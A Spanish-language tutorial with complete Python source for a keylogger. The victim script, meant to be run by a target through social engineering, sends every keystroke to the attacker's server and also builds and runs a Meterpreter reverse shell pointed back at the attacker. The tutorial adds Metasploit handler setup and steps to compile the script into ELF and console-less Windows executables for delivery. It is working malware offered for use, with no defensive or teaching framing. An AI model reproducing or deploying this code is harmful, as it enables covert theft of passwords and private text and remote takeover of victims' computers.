# Keylogger Script Automatizado (Linux y Windows)

## Contenido del script

Tendremos 2 scripts, uno que sera el que tendremos en nuestro host como modo servidor estando a la escucha de todas las teclas que se presionan visualizandolo a tiempo real y despues otro que sera el que tenga que ejecutar el ususario victima mediante ingenieria social, a parte el script de la victima genera automaticamente un `Reverse Shell` por lo que si queremos generar una shell a esa maquina tendremos que estar a la escucha con metasploit con el modulo `multi/handler`.

> server\_host.py

```python
import socket
import colorama
from colorama import Fore, Style, Back
import sys

# Inicializar colorama
colorama.init(autoreset=True)

# Dirección IP y puerto del servidor
HOST = '0.0.0.0'  # Escuchar en todas las interfaces de red
PORT = 7777       # Puerto actualizado

# Crear un socket para escuchar las conexiones entrantes
server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
server_socket.bind((HOST, PORT))
server_socket.listen(1)

# Imprimir el estado de escucha con colores
print(Fore.GREEN + Style.BRIGHT + f"\n{'='*60}")
print(Fore.GREEN + Style.BRIGHT + f"🟢 Escuchando en {HOST}:{PORT}...")
print(Fore.GREEN + Style.BRIGHT + f"{'='*60}\n")

# Aceptar la conexión del cliente
client_socket, client_address = server_socket.accept()
print(Fore.CYAN + Style.BRIGHT + f"🔗 Conexión establecida con {client_address}\n")
print(Fore.YELLOW + Style.BRIGHT + f"{'-'*60}")

# Función para simplificar las teclas
def simplify_key(key):
    key_mappings = {
        'Key.space': ' ',
        'Key.enter': '[ENTER]',
        'Key.tab': '[TAB]',
        'Key.backspace': '[BACKSPACE]',
        'Key.shift': '',
        'Key.ctrl_l': '[CTRL]',
        'Key.alt_l': '[ALT]',
        'Key.cmd': '[CMD]',
    }
    return key_mappings.get(key, key.replace('Key.', '').replace('\'', ''))

# Recibir y procesar las teclas en tiempo real
try:
    while True:
        data = client_socket.recv(1024).decode('utf-8')
        if data:
            keys = data.split(' | ')
            cleaned_text = ''.join([simplify_key(key) for key in keys])
            print(Fore.YELLOW + Style.BRIGHT + '\rTexto recibido: ' + Fore.WHITE + cleaned_text + ' '*10)
        else:
            break
except Exception as e:
    print(Fore.RED + Style.BRIGHT + f"\n❌ Error en la conexión: {e}\n")
finally:
    client_socket.close()
    server_socket.close()
    print(Fore.MAGENTA + Style.BRIGHT + "\n🔒 Conexión cerrada.\n")
```

En este script `server_host.py` lo que tendremos que cambiar sera el puerto de la seccion `PORT =` y poner el puerto que queramos donde queremos que se nos envie la informacion que tendra que estar igual que en el script de `capture_victim.py`.

> capture\_victim.py

```python
import os
import socket
import sys
import platform
import subprocess
import threading
from colorama import Fore, Style, init

# Inicializar colorama
init(autoreset=True)

# Intentar importar pynput para entornos gráficos
try:
    from pynput import keyboard as pynput_keyboard
    use_pynput = True
except ImportError:
    use_pynput = False

# Importar keyboard para entornos no gráficos
if not use_pynput:
    import keyboard as kb

# Dirección IP y puerto del servidor
SERVER_IP = '<YOUR_IP>'  # Reemplaza con la IP del servidor
PORT = 7777
REVERSE_PORT = 7755  # Puerto para la shell reversa

# Crear un socket para conectarse al servidor
client_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
client_socket.connect((SERVER_IP, PORT))

print(Fore.GREEN + Style.BRIGHT + f"\n{'='*60}")
print(Fore.GREEN + Style.BRIGHT + f"🟢 Conectado al servidor en {SERVER_IP}:{PORT}")
print(Fore.GREEN + Style.BRIGHT + f"{'='*60}\n")

# Función para generar la payload de la reverse shell
def generate_reverse_shell():
    os_name = platform.system().lower()
    shell_file = ""

    if os_name == "windows":
        shell_file = "shell.exe"
        command = f"msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST={SERVER_IP} LPORT={REVERSE_PORT} -f exe > {shell_file}"
    elif os_name == "linux":
        shell_file = "shell.elf"
        command = f"msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST={SERVER_IP} LPORT={REVERSE_PORT} -f elf > {shell_file}"
    else:
        print(Fore.RED + Style.BRIGHT + "❌ Sistema operativo no soportado para la reverse shell.")
        return None

    print(Fore.CYAN + Style.BRIGHT + f"⚙️ Generando la reverse shell para {os_name}...")
    subprocess.run(command, shell=True)
    return shell_file

# Función para ejecutar la reverse shell
def execute_reverse_shell(shell_file):
    if shell_file:
        try:
            print(Fore.CYAN + Style.BRIGHT + f"🚀 Ejecutando la reverse shell {shell_file}...")
            if platform.system().lower() == "windows":
                os.startfile(shell_file)
            else:
                subprocess.run(f"chmod +x {shell_file} && ./{shell_file}", shell=True)
        except Exception as e:
            print(Fore.RED + Style.BRIGHT + f"❌ Error ejecutando la reverse shell: {e}")

# Función para capturar teclas
def capture_keystrokes():
    # Configurar variables para el diseño
    data_buffer = []

    # Función para enviar las teclas al servidor
    def send_to_server(key):
        data_buffer.append(key)
        if len(data_buffer) > 20:
            data_buffer.pop(0)
        message = ' | '.join(data_buffer)
        client_socket.sendall(message.encode('utf-8'))

    # Manejador de eventos para pynput
    def on_pynput_key_press(key):
        try:
            key_str = key.char
        except AttributeError:
            key_str = str(key)
        send_to_server(key_str)

    # Configurar el listener para el teclado en entornos gráficos
    if use_pynput:
        print(Fore.CYAN + Style.BRIGHT + "🔄 Usando pynput para captura de teclas en entorno gráfico.")
        listener = pynput_keyboard.Listener(on_press=on_pynput_key_press)
        listener.start()
        listener.join()
    else:
        # Configurar el listener para el teclado en entornos no gráficos
        print(Fore.CYAN + Style.BRIGHT + "🔄 Usando keyboard para captura de teclas en terminal.")
        def on_kb_event(event):
            send_to_server(event.name)
        
        kb.on_press(on_kb_event)
        kb.wait()  # Mantener el script en ejecución en entorno de terminal

# Ejecutar la shell y captura de teclas en paralelo
if __name__ == "__main__":
    # Generar y ejecutar la reverse shell
    shell_file = generate_reverse_shell()

    # Iniciar el hilo de captura de teclas
    keystroke_thread = threading.Thread(target=capture_keystrokes)
    keystroke_thread.start()

    # Ejecutar la reverse shell en el hilo principal
    if shell_file:
        execute_reverse_shell(shell_file)

    # Esperar que el hilo de captura de teclas termine
    keystroke_thread.join()

    # Cerrar la conexión después de terminar
    client_socket.close()
    print(Fore.MAGENTA + Style.BRIGHT + "\n🔒 Conexión cerrada.\n")
```

En este script para la victima hay que modificar la IP en la seccion `SERVER_IP =` poner tu IP en la que quieres que se vea lo que teclea el usuario victima, despues la primera seccion de puerto llamada `PORT =` sera al puerto en el que se va a conectar para enviarte toda la informacion que debera de coincidir con el script `server_host.py` y despues en la seccion de `REVERSE_PORT =` debera de ir el puerto en el que hayamos configurado nuestra escucha en metasploit.

### Preparar la escucha en metasploit

Ahora tendremos que habrir metasploit para prepararnos la escucha en otra pestaña de la terminal a parte.

Pero antes de abrir metasploit prepararemos un comando que automatiza este proceso.

> Para windows

```shell
nano handler_win.rc

#Dentro del nano
use multi/handler
set payload windows/x64/meterpreter/reverse_tcp
set LHOST <IP>
set LPORT <PORT>
run
```

Hay configuraremos el puerto que pusimos en la seccion de `REVERSE_PORT =` en el script de `capture_victim.py` y la IP a la que queremos que se nos envie la shell que sera nuestra IP del host.

> Para linux

```shell
nano handler_lin.rc

#Dentro del nano
use multi/handler
set payload linux/x64/meterpreter/reverse_tcp
set LHOST <IP>
set LPORT <PORT>
run
```

Hay configuraremos el puerto que pusimos en la seccion de `REVERSE_PORT =` en el script de `capture_victim.py` y la IP a la que queremos que se nos envie la shell que sera nuestra IP del host.

Una vez creados estos archivos en mi caso utilizare el de `handler_lin.rc` por lo que abriremos ahora si metasploit de esta manera cargando el archivo.

```shell
msfconsole -q -r handler_lin.rc
```

Info:

```
[*] Processing handler_lin.rc for ERB directives.
resource (handler_lin.rc)> use multi/handler
[*] Using configured payload generic/shell_reverse_tcp
resource (handler_lin.rc)> set payload linux/x64/meterpreter/reverse_tcp
payload => linux/x64/meterpreter/reverse_tcp
resource (handler_lin.rc)> set LHOST 192.168.5.145
LHOST => 192.168.5.145
resource (handler_lin.rc)> set LPORT 7755
LPORT => 7755
resource (handler_lin.rc)> run
[*] Started reverse TCP handler on 192.168.5.145:7755
```

Y esto automaticamente hara que nos pongamos a la escucha.

Por lo que ya estaremos a la espera de que el usuario victima ejecute el script `capture_victim.py` lo que nos haria una visualizacion de lo que teclea a la vez de que obtendremos una shell con metasploit para poder hacer lo que queramos.

## Requisitos para el script

Lo primero que tendremos que instalar en nuestra maquina host sera lo siguiente.

```shell
pip install colorama pynput keyboard
```

Y con esto deberia de funcionar el script.

## Pasarlo a .elf

Primero tendremos que instalarnos una herramienta llamada `Nuitka` de la siguiente forma.

```shell
pip install nuitka
```

Seguidamente sus requisitos.

```shell
sudo apt-get update
sudo apt-get install patchelf
```

Una vez hecho esto ya podremos pasar el `.py` a un `.elf`.

```shell
nuitka --onefile <FILE_VICTIM_SCRIPT>.py
```

Info:

```
Nuitka-Options: Used command line options: --onefile capture_victim_update.py
Nuitka: Starting Python compilation with Nuitka '2.4.5' on Python '3.11' commercial grade 'not installed'.
Nuitka: Using Debian packages for 'colorama,six'.                                       
Nuitka:WARNING: Standalone with Python package from Debian installation may not be working.
Nuitka:WARNING:     Complex topic! More information can be found at https://nuitka.net/info/debian-dist-packages.html
Nuitka-Plugins:anti-bloat: Not including '_json' automatically in order to avoid bloat, but this may cause: may slow down by using fallback implementation.
Nuitka: Completed Python level compilation and optimization.
Nuitka: Generating source code for C backend compiler.
Nuitka: Running data composer tool for optimal constant value handling.               
Nuitka: Running C compilation via Scons.
Nuitka-Scons: Backend C compiler: gcc (gcc 13).
Nuitka-Scons: Slow C compilation detected, used 360s so far, scalability problem.
Nuitka-Scons: Running gcc -o module.Xlib.protocol.request.o -c -std=c11 -fvisibility=hidden -fwrapv -pipe -fpartial-inlining -ftrack-macro-expansion=0 -Wno-deprecated-declarations -fno-var-tracking -Wno-misleading-indentation -fcompare-debug-second -fno-lto -O2 -D__NUITKA_NO_ASSERT__ -D_NUITKA_STANDALONE -D_NUITKA_ONEFILE_MODE -D_NUITKA_ONEFILE_TEMP_BOOL -DPy_NO_ENABLE_SHARED -D_NUITKA_STATIC_LIBPYTHON -D_NUITKA_USE_UNEXPOSED_API -D_NUITKA_CONSTANTS_FROM_INCBIN -D_NUITKA_FROZEN=151 -D_NUITKA_EXE -I/usr/local/lib/python3.11/dist-packages/nuitka/build/inline_copy/zlib -I/usr/include/python3.11 -I. -I/usr/local/lib/python3.11/dist-packages/nuitka/build/include -I/usr/local/lib/python3.11/dist-packages/nuitka/build/static_src -I/usr/local/lib/python3.11/dist-packages/nuitka/build/inline_copy/libbacktrace module.Xlib.protocol.request.c took 1018.43 seconds
Nuitka-Scons: Backend linking program with 94 files (no progress information available for this stage).
Nuitka-Scons:WARNING: You are not using ccache, re-compilation of identical code will be slower than necessary. Use your OS package manager to install it.
Nuitka-Postprocessing: Creating single file from dist folder, this may take a while.
Nuitka-Onefile: Running bootstrap binary compilation via Scons.
Nuitka-Scons: Onefile C compiler: gcc (gcc 13).
Nuitka-Scons: Onefile linking program with 1 files (no progress information available for this stage).
Nuitka-Scons:WARNING: You are not using ccache, re-compilation of identical code will be slower than necessary. Use your OS package manager to install it.
Nuitka-Onefile: Using compression for onefile payload.                                                                                                       
Nuitka-Onefile: Onefile payload compression ratio (27.64%) size 30016420 to 8296318.
Nuitka-Onefile: Keeping onefile build directory 'capture_victim_update.onefile-build'.
Nuitka: Keeping dist folder 'capture_victim_update.dist' for inspection, no need to use it.
Nuitka: Keeping build directory 'capture_victim_update.build'.
Nuitka: Successfully created 'capture_victim_update.bin'.
```

Esto nos habra generado unos cuantos archivos entro ellos el ejecutable que queremos, solo que aparece como `.bin` pero si hacemos un `file` veremos que es un `.elf` por lo que haremos lo siguiente.

```shell
file capture_victim.bin
```

Info:

```
capture_victim.bin: ELF 64-bit LSB pie executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID[sha1]=ed8bb0963e700c17f760ac0d96437b84831e35c3, for GNU/Linux 3.2.0, stripped
```

Y ahora le cambiaremos el nombre.

```shell
mv capture_victim.bin capture_victim.elf
```

Eliminamos los archivos basura.

```shell
rm -rf capture_victim.build
rm -rf capture_victim.dist
rm -rf capture_victim.onefile-build
```

Y ya estaria listo nuesto ejecutable.

## Pasarlo a .exe

Primero tendremos que instalarnos una herramienta llamada `Nuitka` de la siguiente forma.

```shell
pip install nuitka
```

Seguidamente sus requisitos.

```shell
sudo apt-get update
sudo apt-get install patchelf
```

Una vez hecho esto ya podremos pasar el `.py` a un `.exe`.

```shell
nuitka --standalone --windows-disable-console <FILE_VICTIM_SCRIPT>.py
```

Info:

```
Nuitka-Options: Used command line options: --standalone --windows-disable-console capture_victim_update.py
Nuitka:WARNING: The old console option '--disable-console' should not be given anymore, and doesn't
have any effect anymore on non-Windows.
Nuitka: Starting Python compilation with Nuitka '2.4.5' on Python '3.11' commercial grade 'not installed'.
Nuitka: Using Debian packages for 'colorama,six'.                                       
Nuitka:WARNING: Standalone with Python package from Debian installation may not be working.
Nuitka:WARNING:     Complex topic! More information can be found at https://nuitka.net/info/debian-dist-packages.html
Nuitka-Plugins:anti-bloat: Not including '_json' automatically in order to avoid bloat, but this may cause: may slow down by using fallback implementation.
Nuitka: Completed Python level compilation and optimization.
Nuitka: Generating source code for C backend compiler.
Nuitka: Running data composer tool for optimal constant value handling.               
Nuitka: Running C compilation via Scons.
Nuitka-Scons: Backend C compiler: gcc (gcc 13).
Nuitka-Scons: Slow C compilation detected, used 360s so far, scalability problem.
Nuitka-Scons: Running gcc -o module.Xlib.protocol.request.o -c -std=c11 -fvisibility=hidden -fwrapv -pipe -fpartial-inlining -ftrack-macro-expansion=0 -Wno-deprecated-declarations -fno-var-tracking -Wno-misleading-indentation -fcompare-debug-second -fno-lto -O2 -D__NUITKA_NO_ASSERT__ -D_NUITKA_STANDALONE -DPy_NO_ENABLE_SHARED -D_NUITKA_STATIC_LIBPYTHON -D_NUITKA_USE_UNEXPOSED_API -D_NUITKA_CONSTANTS_FROM_INCBIN -D_NUITKA_FROZEN=151 -D_NUITKA_EXE -I/usr/local/lib/python3.11/dist-packages/nuitka/build/inline_copy/zlib -I/usr/include/python3.11 -I. -I/usr/local/lib/python3.11/dist-packages/nuitka/build/include -I/usr/local/lib/python3.11/dist-packages/nuitka/build/static_src -I/usr/local/lib/python3.11/dist-packages/nuitka/build/inline_copy/libbacktrace module.Xlib.protocol.request.c took 965.35 seconds
Nuitka-Scons: Backend linking program with 94 files (no progress information available for this stage).
Nuitka-Scons:WARNING: You are not using ccache, re-compilation of identical code will be slower than necessary. Use your OS package manager to install it.
Nuitka: Keeping build directory 'capture_victim_update.build'.                      
Nuitka: Successfully created 'capture_victim_update.dist/capture_victim_update.bin'.
```

Esto nos habra generado unos cuantos archivos entro ellos el ejecutable que queremos, solo que estara dentro de la carpeta llamada `capture_victim.dist` nos metemos dentro de ella y aparece como `.exe` el archivo `capture_victim.exe`.

Eliminamos los archivos basura.

```shell
rm -rf capture_victim_update.build
rm -rf capture_victim_update.dist
```

Y ya estaria listo nuesto ejecutable.
